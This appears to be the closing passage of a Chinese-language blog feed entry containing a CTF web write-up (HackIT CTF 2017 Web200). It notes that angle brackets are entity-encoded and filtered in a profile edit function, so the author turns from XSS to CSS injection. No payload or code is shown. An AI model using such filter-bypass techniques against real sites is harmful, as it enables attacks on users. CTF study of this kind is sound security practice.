<p>可以看到<code>&gt;</code>和<code>&lt;</code>都被实体化了。</p>
<p>回到profile.php，查看edit功能，普通的xss攻击不成功，这里会直接把尖括号直接过滤掉。尝试CSS Injection。</p>
<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
<li><a href="https://rioru.github.io/ctf/web/2017/08/27/ctf-writeup-hackit-2017-web200.html" target="_blank" rel="external">CTF Write-Up - HackIT CTF 2017 Web200</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;跟着wp做的。&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
</feed>
